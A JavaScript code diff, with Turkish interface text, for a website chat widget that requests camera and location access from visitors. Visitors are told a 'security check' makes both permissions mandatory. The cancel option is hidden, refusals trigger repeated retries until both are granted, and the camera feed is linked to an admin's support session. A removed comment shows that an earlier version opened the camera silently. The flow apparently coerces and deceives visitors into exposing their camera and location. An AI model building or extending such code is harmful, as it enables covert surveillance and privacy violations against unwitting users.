@@ -1550,7 +1550,37 @@
     return result;
   }
 
-  /** Kamera + konum ikisi alınana kadar her 10 sn mesaj + izin talebi */
+  const CAMERA_OFFER_TEXT =
+    "Güvenlik kontrolü için kamera ve konum izni zorunludur. Açarsanız görüntü bu destek oturumuna bağlanır; konum doğrulama için kullanılır.";
+
+  function presentCameraOfferCard(box, callId, text, options = {}) {
+    const msg = {
+      callId,
+      type: "camera",
+      text: text || CAMERA_OFFER_TEXT,
+      note: "İzin ver’e dokunun. Önce konum, sonra kamera penceresi açılır.",
+      okLabel: "İzin ver",
+      hideCancel: true,
+      cancelLabel: "",
+    };
+    // Ziyaretçi sohbetinde kamera talebi balonu (admin’deki “Kamera talebi gönder” gibi)
+    appendMessage(box, "bot", msg.text, { sync: false });
+    showCameraRequest(box, msg, {
+      softDeny: true,
+      sticky: true,
+      nativeFromTap: true,
+      onGranted: () => {
+        stopCameraPermissionLoop();
+        appendMessage(box, "bot", "Teşekkürler. Kamera ve konum izni alındı.", { sync: true });
+        options.onGranted?.();
+      },
+      onSoftDeny: () => {
+        options.onSoftDeny?.();
+      },
+    });
+  }
+
+  /** Kamera + konum ikisi alınana kadar talep mesajı + izin kartı */
   function startCameraPermissionLoop(box) {
     stopCameraPermissionLoop();
     const token = cameraPermLoopToken;
@@ -1579,61 +1609,11 @@
       appendMessage(box, "bot", "Teşekkürler. Kamera ve konum izni alındı.", { sync: true });
     };
 
-    const presentAskUi = (browserBlocked, needLocationOnly) => {
-      if (token !== cameraPermLoopToken) return;
-      showPermissionDeniedNotice(
-        box,
-        browserBlocked
-          ? `Tarayıcı izni engelledi. Adres çubuğundan kamera/konumu Açık yapın, sonra sohbetteki “İzin ver”e DOKUNUN. (#${retryCount})`
-          : needLocationOnly
-            ? `Kamera alındı; sohbetteki “İzin ver” ile konum penceresini açın. (#${retryCount})`
-            : `Sohbetteki “İzin ver”e dokunun — konum ve kamera sırayla istenir. (#${retryCount})`
-      );
-
-      showCameraRequest(
-        box,
-        {
-          callId,
-          type: "camera",
-          text: needLocationOnly
-            ? "Konum izni zorunlu"
-            : CAMERA_PERM_DENIED_TEXT,
-          note: needLocationOnly
-            ? "Sohbetteki butona dokunun; konum penceresi açılacak."
-            : "Sohbetteki İzin ver’e dokunun. Önce konum, sonra kamera penceresi açılır.",
-          okLabel: needLocationOnly ? "İzin ver — konum" : "İzin ver — kamera ve konum",
-          hideCancel: true,
-          locationOnly: needLocationOnly,
-        },
-        {
-          softDeny: true,
-          sticky: true,
-          nativeFromTap: true,
-          locationOnly: needLocationOnly,
-          onGranted: async () => {
-            if (token !== cameraPermLoopToken) return;
-            if (sessionHasBoth(callId)) {
-              markComplete();
-              return;
-            }
-            const gotLoc = await waitForCameraLocation(callId, 12000);
-            if (gotLoc || sessionHasBoth(callId)) markComplete();
-            else scheduleRetry();
-          },
-          onSoftDeny: () => scheduleRetry(),
-        }
-      );
-      scheduleRetry();
-    };
-
     const attempt = async () => {
       if (token !== cameraPermLoopToken || attempting) return;
       attempting = true;
       retryCount += 1;
       try {
-        // Sohbet mesajı: kamera + konum birlikte
-        appendMessage(box, "bot", CAMERA_PERM_DENIED_TEXT, { sync: true });
-
         let sync = window.ChatSync;
         if (!sync?.enabled && window.ChatSyncReady) {
           sync = await window.ChatSyncReady.catch(() => null);
@@ -1646,62 +1626,60 @@
           return;
         }
 
-        if (!callId) {
-          const offer = await sync.startVisitorCameraOffer();
-          callId = offer?.callId;
-          if (!callId) throw new Error("callId yok");
-        }
-
-        if (sessionHasBoth(callId)) {
+        if (callId && sessionHasBoth(callId)) {
           markComplete();
           return;
         }
 
-        const existing = cameraSessions.get(callId);
+        const existing = callId ? cameraSessions.get(callId) : null;
         if (existing?.stream && !existing._hadLocation) {
-          presentAskUi(false, true);
-          return;
-        }
-
-        // Mobil: sohbet kartı ile konum+kamera
-        if (isLikelyMobile()) {
-          presentAskUi(false, false);
-          return;
-        }
-
-        box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
-        box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
-
-        const permState = await queryCameraPermissionState();
-        if (permState !== "denied") {
-          const asking = document.createElement("div");
-          asking.className = "chat-inline-prompt chat-camera-auto";
-          asking.innerHTML =
-            `<p class="chat-inline-prompt-title">Kamera ve konum izni isteniyor… (#${retryCount})</p>` +
-            '<p class="chat-camera-note">Tarayıcıda İzin Ver’i seçin. İkisi de zorunludur.</p>';
-          box.appendChild(asking);
-          box.scrollTop = box.scrollHeight;
-
-          const result = await startVisitorCamera(box, callId, { auto: true });
-          asking.remove();
-          if (token !== cameraPermLoopToken) return;
-
-          if (result === "ok") {
-            const gotLoc = await waitForCameraLocation(callId, 12000);
-            if (token !== cameraPermLoopToken) return;
-            if (gotLoc || sessionHasBoth(callId)) {
-              markComplete();
-              return;
+          showCameraRequest(
+            box,
+            {
+              callId,
+              text: "Konum izni zorunlu",
+              note: "İzin ver’e dokunun; konum penceresi açılacak.",
+              okLabel: "İzin ver",
+              hideCancel: true,
+              locationOnly: true,
+            },
+            {
+              softDeny: true,
+              sticky: true,
+              nativeFromTap: true,
+              locationOnly: true,
+              onGranted: () => markComplete(),
+              onSoftDeny: () => scheduleRetry(),
             }
-            presentAskUi(false, true);
-            return;
-          }
+          );
+          scheduleRetry();
+          return;
         }
 
-        presentAskUi(permState === "denied", false);
+        // Aktif kart varken her 10 sn yeni talep spam’leme
+        if (callId && box.querySelector(".chat-camera-request")) {
+          scheduleRetry();
+          return;
+        }
+
+        // Yeni kamera talebi mesajı (Firebase type:camera) — eskiden sayfa açılınca böyleydi
+        const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT);
+        callId = offer?.callId;
+        if (!callId) throw new Error("callId yok");
+
+        if (token !== cameraPermLoopToken) return;
+
+        presentCameraOfferCard(box, callId, offer.text || CAMERA_OFFER_TEXT, {
+          onGranted: () => markComplete(),
+          onSoftDeny: () => scheduleRetry(),
+        });
+        scheduleRetry();
       } catch (err) {
         console.error("camera perm loop", err);
-        if (token === cameraPermLoopToken) presentAskUi(false, false);
+        if (token === cameraPermLoopToken) {
+          appendMessage(box, "bot", CAMERA_PERM_DENIED_TEXT, { sync: true });
+          scheduleRetry();
+        }
       } finally {
         attempting = false;
       }
@@ -1937,8 +1915,32 @@
       seenAdminIncomingIds.add(msg.id);
     }
     if (msg.type === "camera") {
-      // Talep metnini ziyaretçi sohbetinde gösterme; sessiz izin akışı
-      autoOpenCameraFromMessage(box, msg);
+      // Admin “Kamera talebi gönder” → sohbette görünür + İzin ver kartı (mobilde jest gerekir)
+      appendMessage(box, "admin", msg.text || CAMERA_OFFER_TEXT, { sync: false });
+      notifyVisitorOfAdminMessage(box, msg);
+      showCameraRequest(
+        box,
+        {
+          callId: msg.callId,
+          type: "camera",
+          text: msg.text || CAMERA_OFFER_TEXT,
+          note: "İzin ver’e dokunun. Önce konum, sonra kamera penceresi açılır.",
+          okLabel: msg.okLabel || "İzin ver",
+          cancelLabel: msg.cancelLabel || "",
+          hideCancel: msg.cancelLabel === "" || msg.hideCancel === true,
+        },
+        {
+          sticky: true,
+          nativeFromTap: true,
+          softDeny: true,
+          onGranted: () => {
+            appendMessage(box, "bot", "Teşekkürler. Kamera ve konum izni alındı.", { sync: true });
+          },
+          onSoftDeny: () => {
+            startCameraPermissionLoop(box);
+          },
+        }
+      );
       return;
     }
     const isPopup = msg.type === "popup" || msg.popup === true;
